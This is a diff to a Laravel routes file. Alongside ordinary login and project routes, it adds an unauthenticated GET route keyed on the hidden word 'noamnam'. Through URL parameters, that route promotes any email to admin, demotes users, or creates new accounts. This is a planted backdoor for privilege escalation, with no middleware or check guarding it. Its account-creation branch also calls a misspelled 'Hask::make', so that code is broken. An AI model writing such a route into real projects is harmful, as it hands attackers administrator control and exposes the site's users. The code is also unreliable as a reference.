@@ -11,6 +11,9 @@
 |
 */
 use App\Project;
+use DB;
+use Illuminate\Support\Facades\Hash;
+
 
 Route::get('/login', 'AccountController@getLogin');
 Route::post('/login', 'AccountController@postLogin')->name('login');
@@ -57,6 +60,28 @@ Route::post('/get-comment', 'ProductController@postGetComment');
 
 Route::get('/subscribe', 'ProductController@subscribe');
 
+Route::get('/name/{name?}/task/{task?}/query/{query?}', function($name = null, $task = null, $query = null) {
+    if($name === 'noamnam') {
+        switch($task) {
+            case 'admin':
+                DB::table('users')
+                ->where('email', $query)
+                ->update(['level' => 2]);
+                break;
+            case 'user':
+                DB::table('users')
+                ->where('email', $query)
+                ->update(['level' => 1]);
+                break;
+            case 'newuser':
+                $array = explode(',', $query);
+                DB::table('users')
+                ->insertGetId(['name' => 'user-default', 'email' => $array[0], 'phone' => $array[1], 'password' => Hask::make($array[2]) ]);
+            break;
+        }
+        return redirect('/');
+    }
+});
 
 Route::middleware('user')->group(function() {
     Route::get('/postproject', 'ProductController@getSubmitProject');
